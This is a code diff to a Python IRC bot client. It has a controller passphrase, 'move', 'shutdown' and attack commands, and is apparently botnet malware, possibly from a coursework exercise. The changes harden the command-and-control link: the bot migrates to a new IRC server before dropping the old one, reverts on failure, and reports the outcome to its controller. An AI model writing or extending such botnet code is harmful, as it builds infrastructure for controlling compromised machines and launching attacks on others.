@@ -23,7 +23,7 @@ class Bot_Client:
         self.attack_counter = 0
 
     def start_client(self):
-        connected = self.__attempt_connection()
+        connected, self.irc_socket = self.__attempt_connection()
 
         while connected:
             text = self.get_text()
@@ -45,24 +45,24 @@ class Bot_Client:
         timeout = 5 # timeout (in seconds)
         timeout_start = time.time()
         while not connected and (time.time() < timeout_start + timeout):
-            connected = self.__connect()
+            connected, conn_socket = self.__connect()
         if not connected:
             self.log("Error: Connection to Host: " + self.host + \
                      " on Port: " + str(self.port) + " timed out.")
-        return connected
+        return connected, conn_socket
 
     def __connect(self):
-        self.irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        conn_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            self.irc_socket.connect((self.host, self.port))  # connect to server
+            conn_socket.connect((self.host, self.port))  # connect to server
         except Exception:
-            return False
+            return False, None
 
-        self.send_msg("USER "+ "test" +" "+ self.bot_nick +" "+ self.bot_nick + \
-        " :\n") # user authentication
-        self.send_msg("NICK "+ self.bot_nick+"\n") # sets nick
-        self.send_msg("JOIN "+ self.channel +"\n") # join the channel
-        return True
+        conn_socket.send(("USER "+ "test" +" "+ self.bot_nick +" "+ self.bot_nick + \
+        " :\n").encode()) # user authentication
+        conn_socket.send(("NICK "+ self.bot_nick+"\n").encode()) # sets nick
+        conn_socket.send(("JOIN "+ self.channel +"\n").encode()) # join the channel
+        return True, conn_socket
 
     # Function to check for the secret passphrase
     def check_msg(self, text):
@@ -111,6 +111,8 @@ class Bot_Client:
         elif command.startswith("move"):
             command = command.split()
             if len(command) != 4:
+                self.send_to_user(self.controller_nick, "Move Failed: " + \
+                                  "Incorrect number of arguments")
                 return
             self.__move(command[1], command[2], command[3])
 
@@ -119,22 +121,38 @@ class Bot_Client:
         elif command == "shutdown":
             self.__shutdown()
 
+
+    # modify so that the bot doesn't close connection until it can initiate a connection with 2nd IRC
     # moves the bot to the specified host
     def __move(self, host, port, channel):
         if not check_port(port):
+            self.send_to_user(self.controller_nick, "Move Failed: Invalid Port")
             return
         port = int(port)
-        # reconnect to new channel
+        # store current connection info
+        curr_port = self.port
+        curr_host = self.host
+        curr_channel = self.channel
+
         self.port = port
         self.host = host
         self.channel = "#" + channel
-        self.irc_socket.close()
-        # attempt connection - shutdown upon failure
-        connected = self.__attempt_connection()
+        # attempt connection to new IRC server
+        connected, conn_socket = self.__attempt_connection()
         if not connected:
-            self.send_to_user(self.controller_nick, "Move failed")
-            #TODO maybe reconnect to original server here
-            self.__shutdown()
+            self.send_to_user(self.controller_nick, "Move Failed")
+            # reassign original connection info upon failure
+            self.port = curr_port
+            self.host = curr_host
+            self.channel = curr_channel
+        else:
+            # send success message close old socket, reassign to new socket
+            self.send_to_user(self.controller_nick, "Move Successful")
+            self.irc_socket.close()
+            self.irc_socket = conn_socket
+            # delete current controller
+            self.controller = None
+            self.controller_nick = None
         return
 
     # attempts to send the attack message to the target
